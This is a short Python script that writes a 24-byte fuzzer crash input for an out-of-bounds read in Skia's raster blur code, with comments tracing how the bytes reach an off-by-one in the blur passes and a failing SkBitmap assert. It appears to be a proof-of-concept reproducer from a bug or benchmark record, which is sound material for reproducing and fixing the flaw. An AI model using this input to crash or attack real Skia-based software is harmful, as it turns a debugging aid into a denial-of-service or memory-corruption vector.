# Re-create the 24-byte crash input for skia-raster8888-blur-oob.
#
# This is crash_input_crash-2d2bcec371d77df09ae64f62cd7163a805 from the O2
# source record. The harness consumes these bytes (back-to-front, as
# FuzzedDataProvider does) to build a recursive SkImageFilters chain whose
# Blur node, applied via SkCanvas::drawRect on a 64x64 raster surface, drives
# Raster8888BlurAlgorithm::blur into the eval_blur_passes X->Y rebind off-by-one
# and the failing SkBitmap::getAddr assert at SkBitmap.cpp:387.
poc = bytes([
    0xff, 0xff, 0xa2, 0xa2, 0xa2, 0xaa, 0xb2, 0xa2,
    0xa5, 0xc3, 0x10, 0x29, 0x00, 0xb2, 0xa2, 0xaa,
    0xa5, 0xa2, 0xc3, 0xff, 0xff, 0xff, 0x01, 0x00,
])
open("poc.bin", "wb").write(poc)
